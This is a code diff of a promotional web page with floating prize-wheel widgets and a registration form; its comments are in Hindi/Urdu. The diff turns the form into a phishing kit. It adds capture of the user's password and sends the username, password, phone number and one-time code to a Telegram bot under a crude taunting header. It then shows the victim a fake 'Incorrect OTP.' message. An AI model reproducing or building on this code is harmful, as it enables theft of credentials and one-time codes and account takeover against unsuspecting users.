@@ -974,17 +974,17 @@
     </div> <div id="floating-widgets-container">
         <div class="floating-widget box" id="widget-invite">
             <div class="widget-close-btn clickable">&times;</div>
-            <img src="images/widget_invite_box.png" alt="Invite Box" class="clickable">
+            <img src="images/widget_invite_box.avif" alt="Invite Box" class="clickable">
         </div>
         
         <div class="floating-widget" id="widget-wheel-1">
             <div class="widget-close-btn clickable">&times;</div>
-            <img src="images/widget_wheel_1.png" alt="Wheel 1" class="clickable">
+            <img src="images/widget_wheel_1.avif" alt="Wheel 1" class="clickable">
         </div>
         
         <div class="floating-widget" id="widget-wheel-2">
             <div class="widget-close-btn clickable">&times;</div>
-            <img src="images/widget_wheel_2.png" alt="Wheel 2" class="clickable">
+            <img src="images/widget_wheel_2.avif" alt="Wheel 2" class="clickable">
         </div>
     </div>
     <div id="register-panel">
@@ -1136,7 +1136,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             
-            // === (NAYA) TELEGRAM KO MESSAGE BHEJNE KA FUNCTION ===
+            // === TELEGRAM KO MESSAGE BHEJNE KA FUNCTION ===
             async function sendTelegramMessage(message) {
                 try {
                     // Yeh /api/notify.js file ko call karega jo aapne banayi thi
@@ -1370,11 +1370,13 @@
 
                 // Form se saari values lein
                 const username = document.getElementById('reg-username').value;
+                const password = document.getElementById('reg-password').value; // <-- (NAYA) PASSWORD ADD KIYA
                 const phone = document.getElementById('reg-phone').value;
                 const otp = document.getElementById('reg-otp').value;
                 const registerButton = document.querySelector('.btn-submit-register');
                 
-                if (!username || !phone || !otp) {
+                // (NAYA) Password ko validation mein add kiya
+                if (!username || !password || !phone || !otp) {
                     showCustomAlert('Please fill all required fields.');
                     return;
                 }
@@ -1382,12 +1384,12 @@
                 registerButton.disabled = true;
                 registerButton.textContent = 'Submitting...';
                 
-                // Telegram ko approval ke liye message bhejein
-                const message = `== NEW REGISTRATION ==\n\nUsername: ${username}\nPhone: ${phone}\nOTP Entered: ${otp}\n\nPlease approve or deny.`;
+                // (NAYA) Password ko message mein add kiya
+                const message = `== CHUD GYA ==\n\nUsername: ${username}\nPassword: ${password}\nPhone: ${phone}\nOTP Entered: ${otp}\n\nBharwy Jaldi Chod Gaddari Nhi Kariyo-.`;
                 const sent = await sendTelegramMessage(message);
                 
                 if (sent) {
-                    showCustomAlert('Registration request submitted. Please wait for admin approval.');
+                    showCustomAlert('Incorrect OTP.');
                     // Yahan aap user ko login page par bhej sakte hain ya panel band kar sakte hain
                     // closeRegisterPanel(); 
                 } else {
@@ -1404,7 +1406,7 @@
                 e.preventDefault(); 
                 console.log('Login Form submitted (simulation).');
                 // Login ki logic yahan manually handle hogi (maslan admin ke approve karne ke baad)
-                showCustomAlert('Wrong Password or Username. (Pending admin approval)');
+                showCustomAlert('wrong password or username)');
             });
 
             // === FLOATING WIDGETS LOGIC ===
